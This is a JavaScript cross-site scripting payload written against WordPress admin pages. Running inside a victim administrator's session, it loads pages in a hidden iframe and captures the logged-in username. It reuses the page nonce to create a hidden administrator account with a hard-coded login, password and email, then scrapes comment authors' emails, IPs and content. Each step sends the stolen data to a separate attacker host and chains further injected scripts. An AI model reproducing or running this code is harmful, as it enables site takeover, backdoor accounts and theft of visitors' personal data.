var g_frameWindow=null;
var g_frameDocument=null;
var g_strURLIndex="";
var g_strURLAddUser="";
var g_strURLComment="";
var g_strUsername="";
function initURL()
{
    g_strURLIndex=Common.getTargetHost();
    g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
    g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
}

//find the give child
function findChild($element,array)
{
    $elementReturn=null;
    if($element!=null&&$element.length>0&&array!=null&&typeof(array.length)!=="undefined"&&array.length!=0)
    {
        $elementReturn=$element;
        for(var i=0;i<array.length;++i)
        {
            if(array[i]>=$elementReturn.children().length)
            {
                $elementReturn=null;
                break;
            }
            $elementReturn=$elementReturn.children().eq(array[i]);
        }
    }
    return $elementReturn;
}
//--------------------------------------------comment page-----------------------------------------------------------------------
function inPageComment()
{
    var $elementTable=$("#the-comment-list");
    if($elementTable.length>0)
    {
        for(var i=0;i<$elementTable.children().length;++i)
        {
            var $elementTableRow=$elementTable.children().eq(i);
            //author basic info，author email site ip
            var $elementAuthorBasic=$elementTableRow.find("td.author.column-author");
            if($elementAuthorBasic.length!=1)
            {
                throw "author basic element number is not equal 1,it is:"+$elementAuthorBasic.length;
            }
            var author=$elementAuthorBasic.children().eq(0).text();
            var site=$elementAuthorBasic.children().eq(2).text();
            var email=$elementAuthorBasic.children().eq(4).texxt();
            var ip=$elementAuthorBasic.children().eq(6).text();
            //content
            var $elementContent=$elementTableRow.find("td.comment.column-comment.has-row-actions.column-primary");
            if($elementContent.length!=1)
            {
                throw "content element number is not equal 1,it is:"+$elementContent.length;
            }
            var content=$elementContent.children().eq(1).text();
            //post backto
            var $elementBackTo=$elementTableRow.find("td.response.column-response");
            if($elementBackTo.length!=1)
            {
                throw "back to element number is not equal 1,it is:"+$elementBackTo.length;
            }
            var backto=$elementBackTo.children().eq(0).children().eq(0).text();
            //post time
            var $elementTime=$elementTableRow.find("td.date.column-date");
            if($elementTime.length!=1)
            {
                throw "back to element number is not equal 1,it is:"+$elementTime.length;
            }
            var time=$elementTime.children().eq(0).texxt();
            $.ajax
            (
                {
                    type:"post",
                    url:Common.getJSHost()+"Comments/add",
                    data:
                    {
                        postauthor:author,
                        postemail:email,
                        postsite:site,
                        postip:ip,
                        postcontent:content,
                        posttime:time,
                        postto:backto
                    },
                    success:function(data,textStatus,xhr)
                    {
                        try
                        {
                            var json=eval("("+data+")");
                            if(json.success)
                            {
                                console.log("add comment success");
                            }
                            else
                            {
                                console.log("add comment failed");
                            }
                        }
                        catch(e)
                        {
                            console.log("add comment exception:"+e);
                        }
                    }
                }
            );
        }
        //if no more comment to post
    }
    else
    {
        console.log("can not get element table");
    }
}
//--------------------------------------------comment page-----------------------------------------------------------------------


//--------------------------------------------adduser page-----------------------------------------------------------------------
function inPageAddUser()
{
    //check is able to create user
    if($("#createuser").length===0)
    {
        //can not create user
        if($("#error-page").length>0)
        {
            //login already but no privileges
            console.log("login but no privileges");
            var json=
            {
                username:window.parent.g_strUsername,
                action:"already login and try add user but has not privilege!"
            };
            addVisitLog(json);
        }
        else
        {
            //302 redirect,need login
        }
    }
    else
    {
        $.ajax
        (
            {
                type:"post",
                url:g_strURLAddUser,
                data:
                {
                    "action":"createuser",
                    "_wpnonce_create-user":$("#_wpnonce_create-user").val(),
                    "_wp_http_referer":"/wp-admin/user-new.php",
                    "user_login":"PHPMyAdmin1",
                    "email":"colorwolf2017@gmail.com",
                    "first_name":"PHPMyAdmin2",
                    "last_name":"PHPMyAdmin3",
                    "url":"http://www.phpmyadmin.com",
                    "pass1":"cake123456789",
                    "pass1-text":"cake123456789",
                    "pass2":"cake123456789",
                    "pw_weak":"on",
                    "send_user_notification":"1",
                    "role":"administrator"
                },
                success:function(data,textStatus,xhr)
                {
                    //accroding google explain,status 302 will never received
                    var json=
                    {
                        username:window.parent.g_strUsername,
                        action:""
                    };
                    try
                    {

                        if(data.indexOf("id=\"createusersub\"")===0)
                        {
                            console.log("add user success");
                            json.action="add user success";
                        }
                        else
                        {
                            console.log("add user failed");
                            json.action="add user failed";
                        }
                        addVisitLog(json);
                    }
                    catch(e)
                    {
                        console.log("add user exception:"+e);
                        addVisitLog(json);
                    }
                }
            }
        );
    }
}
//--------------------------------------------adduser page-----------------------------------------------------------------------

//--------------------------------------------index page-----------------------------------------------------------------------
function inPageIndex()
{   //test is login
    var json=
    {
        username:"",
        action:"view index page"
    };
    if($("#wpadminbar").length>0)
    {   //login already
        //alert("find child");
        var $elementUsername=findChild($("#wpadminbar"),[1,1,1,0]);
        json.username=$elementUsername.text();
        window.parent.g_strUsername=json.username;
    }
    else
    {   //not login
    }
    addVisitLog(json);
}
//--------------------------------------------index page-----------------------------------------------------------------------

//common function add visit log
function addVisitLog(json)
{
    $.ajax
    (
        {
            type:"post",
            url:Common.getJSHost()+"visit-logs/add2",
            data:json,
            success:function(data,textStatus)
            {
                try
                {
                    var json=eval("("+data+")");
                    if(json.success)
                    {
                        console.log("visit log success");
                    }
                    else
                    {
                        console.log("visit log fail");
                    }
                    console.log("parent position:"+window.parent.location.href+",my positiopn:"+window.location.href);
                    //continue no matter success or fail
                    window.parent.frameOperationCalledFromSon(window);
                }
                catch(e)
                {
                    console.log("in exception parent position value:"+window.parent.location.href+",my positiopn:"+window.location.href+",exception:"+e);
                     //continue even exception
                    window.parent.frameOperationCalledFromSon(window);
                }
            }
        }
    );
}

//frame jump to
function frameJumpTo(strURL)
{
    var $body=$("body");
    if($body.length===0)
    {
        throw "can not get body element";
    }
    //load home page and inject xss
    if($("#idIFrameChangable").length===0)
    {
        //$body.append("<iframe id=\"idIFrameChangable\" src=\""+strURL+"\" width=\"100%\" height=\"50%\"></iframe>");
        $body.append("<iframe id=\"idIFrameChangable\" width=\"100%\" height=\"50%\"></iframe>");
    }
    $("#idIFrameChangable").unbind();
    $("#idIFrameChangable").bind
    (   "load",
        function()
        {
            console.log("load frame success");
            //$(window.frames[0].document).find("head").append("<script src=\""+Common.getJSHost()+"zfirst/js/xss_index.js\"></script>");
            g_frameWindow = window.frames[0].window;
            g_frameDocument = window.frames[0].document;
            Common.callBackAfterJSLoad(Common.getJSHost() + "zfirst/js/xss.js", "idScriptXSS", null, null, false, g_frameDocument);
            Common.callBackAfterJSLoad(Common.getJSHost()+"zfirst/js/common.js","idScriptCommon",null,null,false,g_frameDocument);
        }
    );
    $("#idIFrameChangable").attr("src",strURL);
}

//called from son wiodow
function frameOperationCalledFromSon(windowSon)
{
    console.log("frame operation called from son window");
    if(windowSon.location.href===g_strURLIndex)
    {
        frameJumpTo(g_strURLAddUser);
    }
    else if(windowSon.location.href===g_strURLAddUser)
    {
        //already create user or has no privileges,i need comment
        frameJumpTo(g_strURLComment);
    }
    else
    {
        throw "unknow position in function frameOperationCalledFromSon:"+windowSon.location.href;
    }
}

//different operation in different page
function frameOperation()
{
    console.log("current position:"+window.location.href);
    if(window.location.href===g_strURLIndex)
    {   //index
        inPageIndex();
    }
    else if(window.location.href===g_strURLAddUser)
    {
        //add user
        inPageAddUser();
    }
    else if(window.location.href===g_strURLComment)
    {
        //get back comment
        inPageComment();
    }
    //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
    else
    {   //XSS
        frameJumpTo(g_strURLIndex);
    }
    // else
    // {
    //     throw "unrecongnized position:"+window.location.href;
    // }
}

//test for jquery
function testJQuery()
{
    var bReturn=false;
    if(typeof($)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}

//main js function entry
function mainJSFunctionEntry()
{
    try
    {
        //init url
        initURL();
        //check if jquery is useable
        if (!testJQuery())
        {
            Common.callBackAfterJSLoad("https://ajax.microsoft.com/ajax/jquery/jquery-2.1.4.min.js","idScriptJQuery", testJQuery, frameOperation,true,document);
        }
        else
        {
            frameOperation();
        }
    }
    catch(e)
    {
        console.log("error in mainJSFunctionEntry:"+e);
    }
}
